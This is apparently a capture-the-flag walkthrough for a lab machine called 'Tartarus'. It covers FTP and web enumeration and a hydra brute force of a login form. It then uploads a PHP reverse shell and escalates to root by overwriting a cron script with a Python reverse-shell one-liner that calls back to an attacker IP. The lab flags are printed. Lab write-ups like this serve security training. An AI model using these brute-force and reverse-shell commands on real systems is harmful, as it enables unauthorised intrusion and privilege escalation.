# Tartarus

This is an beginner box based on simple enumeration of services and basic privilege escalation techniques.

# User Flag

## Services enumeration

Let's start by discovering the services with Nmap:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

~~~

## FTP

The FTP service with anonymous access hosts a test file, which is a rabbit hole. Nothing interesting here:

~~~
unknown@kali:/data/Tartarus$ ftp 10.10.26.177
Connected to 10.10.26.177.
220 (vsFTPd 3.0.3)
Name (10.10.26.177:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> get test.txt -
remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
vsftpd test file
226 Transfer complete.
17 bytes received in 0.00 secs (16.9231 kB/s)
~~~

Now, something should ring the bell. There is a "..." directory.

~~~
ftp> cd "..."
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK.
~~~

The file in this directory (`yougotgoodeyes.txt`) tells us about a hidden location (`/sUp3r-s3cr3t`):

~~~
ftp> get yougotgoodeyes.txt -
remote: yougotgoodeyes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
/sUp3r-s3cr3t
226 Transfer complete.
14 bytes received in 0.00 secs (15.7692 kB/s)
ftp> 
~~~

## HTTP

### admin-dir

Accessing the target over port 80/tcp shows a default Apache2 page for Ubuntu, but there is a `robots.txt` file that discloses a hidden location (`/admin-dir`), as well as a username (`d4rckh`):

~~~
unknown@kali:/data/Tartarus$ curl http://10.10.26.177/robots.txt
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
~~~

The `/admin-dir` location hosts 2 files: `userid` and `credentials.txt`:

~~~
unknown@kali:/data/Tartarus$ curl -s http://10.10.26.177/admin-dir/ | html2text 
****** Index of /admin-dir ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[TXT]]       credentials.txt  2020-07-05 21:45  760  
[[   ]]       userid           2020-07-05 21:45   78  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.26.177 Port 80
~~~

### sUp3r-s3cr3t

This location hosts an authentication form.

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Login</title>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
		<link href="style.css" rel="stylesheet" type="text/css">
	</head>
	<body>
		<div class="login">
			<h1>Login</h1>
			<form action="authenticate.php" method="post">
				<label for="username">
					<i class="fas fa-user"></i>
				</label>
				<input type="text" name="username" placeholder="Username" id="username" required>
				<label for="password">
					<i class="fas fa-lock"></i>
				</label>
				<input type="password" name="password" placeholder="Password" id="password" required>
				<input type="submit" value="Login">
			</form>
		</div>
	</body>
</html>
```

Let's use hydra with the 2 files gathered so far to brute force the authentication.

~~~
unknown@kali:/data/Tartarus/files$ hydra -L userid -P credentials.txt 10.10.127.236 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-22 07:32:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1313 login tries (l:13/p:101), ~83 tries per task
[DATA] attacking http-post-form://10.10.127.236:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect
[80][http-post-form] host: 10.10.127.236   login: enox   password: P@ssword1234
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-22 07:32:40
~~~

Let's authenticate with the credentials found (`enox:P@ssword1234`). We are redirected to http://10.10.127.236/sUp3r-s3cr3t/home.php with an upload form.

## Upload form

Let's upload a [PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz). Make sure you modify both your IP and port to the PHP file before uploading it.

The reverse shell is uploaded but we don't know where. Let's use dirsearch within the `/sUp3r-s3cr3t` directory to find sub-directories:

~~~
unknown@kali:/data/Tartarus/files$ /data/src/dirsearch/dirsearch.py -u http://10.10.127.236/sUp3r-s3cr3t/ -E -w /usr/share/wordlists/dirb/common.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /data/src/dirsearch/logs/errors-20-08-22_07-43-36.log

Target: http://10.10.127.236/sUp3r-s3cr3t/

[07:43:36] Starting: 
[07:43:37] 200 -  732B  - /sUp3r-s3cr3t/
[07:43:37] 403 -  278B  - /sUp3r-s3cr3t/.hta
[07:43:48] 301 -  328B  - /sUp3r-s3cr3t/images  ->  http://10.10.127.236/sUp3r-s3cr3t/images/
[07:43:49] 200 -  732B  - /sUp3r-s3cr3t/index.html

Task Completed
~~~

Browsing http://10.10.127.236/sUp3r-s3cr3t/images/ reveals the presence of an `uploads` subdirectory (`/sUp3r-s3cr3t/images/uploads/`).

## Reverse shell

Let's run a listener:

~~~
$ rlwrap nc -nlvp 4444
~~~

And call our reverse shell: http://10.10.127.236/sUp3r-s3cr3t/images/uploads/shell.php. We now have a shell:

~~~
unknown@kali:/data/Tartarus/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.9.0.54] from (UNKNOWN) [10.10.127.236] 52018
Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:46:19 up 24 min,  0 users,  load average: 0.00, 0.01, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
~~~

## User flag

~~~
$ cat /home/d4rckh/user.txt
0f7dbb2243e692e3ad222bc4eff8521f
~~~

Answer: `0f7dbb2243e692e3ad222bc4eff8521f`


# Root Flag

## Cleanup script

Having a look at d4rckh's home directory reveals the presence of a cleanup.py script that cleans up the `/home/cleanup/` directory.

~~~
$ cat cleanup.py
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /home/cleanup/* ')
except:
	sys.exit()
~~~

This is typically the kind of script that is scheduled via a cron job. Using `pspy64`, we can confirm that the script is run automatically by `root`.

~~~
2020/08/22 06:06:01 CMD: UID=0    PID=1864   | python /home/d4rckh/cleanup.py 
2020/08/22 06:06:01 CMD: UID=0    PID=1863   | /bin/sh -c    python /home/d4rckh/cleanup.py 
2020/08/22 06:06:01 CMD: UID=0    PID=1862   | /usr/sbin/CRON -f 
2020/08/22 06:06:01 CMD: UID=0    PID=1865   | python /home/d4rckh/cleanup.py 
~~~

Moreover, the file is world-writable, which means we can modify it.

~~~
$ cd d4rckh
$ ls -ila
total 16
257890 drwxr-xr-x 2 d4rckh d4rckh 4096 Jul  5 21:35 .
  1920 drwxr-xr-x 5 root   root   4096 Jul  5 21:45 ..
259257 -rwxrwxrwx 1 root   root    129 Jul  5 21:45 cleanup.py
259258 -rw-r--r-- 1 d4rckh d4rckh   33 Jul  5 21:45 user.txt
~~~

## Priviledged reverse shell

Let's take advantage of this vulnerability and replace its content with another reverse shell:

~~~
printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.54",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
~~~

## Root flag

In another listener, running on port 5555, we now have a priviledged reverse shell:

~~~
cat unknown@kali:/data/src$ rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.9.0.54] from (UNKNOWN) [10.10.127.114] 51940
bash: cannot set terminal process group (1602): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu-xenial:~# pwd
pwd
/root
root@ubuntu-xenial:~# ls
ls
root.txt
root@ubuntu-xenial:~# cat root.txt
cat root.txt
7e055812184a5fa5109d5db5c7eda7cd
~~~

Answer: `7e055812184a5fa5109d5db5c7eda7cd`
